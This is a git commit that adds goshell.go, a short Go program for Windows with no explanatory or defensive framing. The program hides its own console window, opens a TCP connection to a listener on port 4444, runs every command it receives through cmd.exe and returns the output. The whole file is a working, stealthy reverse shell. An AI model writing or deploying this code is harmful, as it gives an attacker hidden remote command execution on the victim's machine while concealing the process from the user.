5f1d6848683e632a1bd24b20639a957616da3695
akbarq <7432727+akbarq@users.noreply.github.com>
2023-03-01 22:54:47 -0500

    Create goshell.go

---
+++ goshell.go
@@ -0,0 +1,52 @@
+package main
+
+import (
+	"bufio"
+	"net"
+	"os/exec"
+	"syscall"
+	
+)
+
+var (
+	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
+	moduser32   = syscall.NewLazyDLL("user32.dll")
+
+	procGetConsoleWindow = modkernel32.NewProc("GetConsoleWindow")
+	procShowWindow       = moduser32.NewProc("ShowWindow")
+)
+
+const (
+	SW_HIDE = 0
+)
+
+func hideConsoleWindow() {
+	consoleWindow, _, _ := procGetConsoleWindow.Call()
+	if consoleWindow != 0 {
+		_, _, _ = procShowWindow.Call(consoleWindow, uintptr(SW_HIDE))
+	}
+}
+
+func main() {
+	hideConsoleWindow()
+
+	conn, err := net.Dial("tcp", "0.0.0.0:4444")
+	if err != nil {
+		panic(err)
+	}
+
+	for {
+		message, err := bufio.NewReader(conn).ReadString('\n')
+		if err != nil {
+			panic(err)
+		}
+
+		cmd := exec.Command("cmd", "/C", message)
+		output, err := cmd.Output()
+		if err != nil {
+			conn.Write([]byte(err.Error() + "\n"))
+		} else {
+			conn.Write(output)
+		}
+	}
+}
